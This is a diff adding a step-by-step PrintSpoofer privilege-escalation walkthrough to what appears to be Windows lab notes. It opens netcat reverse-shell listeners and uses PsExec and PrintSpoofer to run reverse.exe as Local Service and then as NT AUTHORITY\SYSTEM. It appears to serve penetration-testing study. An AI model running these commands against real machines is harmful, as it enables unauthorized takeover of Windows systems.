@@ -1986,6 +1986,75 @@ nc -lnvp 4444
 
 - <details>
       <summary>PrintSpoofer</summary>
+
+     > There are 3 important levels of permissions in Windows:
+     
+     | **Account** | **Level** | **Description** |
+     | ----------------------- | ----------------- | -------------------------------------- |
+     | **Local Service** | Low privilege | Weak system service, very limited permissions
+     | **Administrator** | High privilege | It can do almost everything, but not SYSTEM |
+     | **NT AUTHORITY\SYSTEM** | Highest privilege | The most powerful account on Windows |
+     
+     > Here we will start from the Local Service account and go to SYSTEM.
+
+     ## 1. Step 1 – Start a listener on Kali
+     
+     ```ruby
+     nc -lvnp 4444
+     ```
+     
+     
+     ## 2. login as admin and open `cmd` as adminstrator and run this command:
+     
+     ```ruby
+     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+     ```
+     
+     - ``PSExec64.exe`` : tool to run a program with "Local Service" account privileges.
+     - **`-i`** : interactive mode
+     - **`-u "nt authority\local service"`** : Run the program as Local Service user.
+     
+     
+     
+     <img width="1731" height="604" alt="image" src="https://github.com/user-attachments/assets/d54d52fc-3def-4f26-8509-a0a3a4d4daa1" />
+     
+     > ---
+     > ### 📌 _Goal → On the Kali terminal, you will receive the first reverse shell with Local Service privileges._
+     > ---
+     
+     
+     
+     ## 3. Start a listener on Kali
+     
+     
+     ```ruby
+     nc -lvnp 4444
+     ```
+     
+     
+     
+     
+     ## 4.  Step 3 – Exploit PrintSpoofer
+     
+     
+     ```ruby
+     C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+     ```
+     
+     - **`PrintSpoofer.exe`** : PrintSpoofer is an Exploit that exploits SeImpersonatePrivilege.
+        - The Local Service usually has this privilege.
+        - Result: We can circumvent Windows and upgrade to NT AUTHORITY\SYSTEM privileges.
+     - **`-c "C:\PrivEsc\reverse.exe"`** : The command you want to run is as SYSTEM, and here we run reverse.exe.
+     
+     
+     <img width="828" height="178" alt="image" src="https://github.com/user-attachments/assets/a39c6221-1434-498b-a65f-75a056c0b0df" />
+     
+     
+     
+     ## 5. recive the shell with **`authority\system`**
+     
+     <img width="932" height="334" alt="image" src="https://github.com/user-attachments/assets/e806caf2-744e-4bf6-b71a-70339f124343" />
+
   </details>
 
 
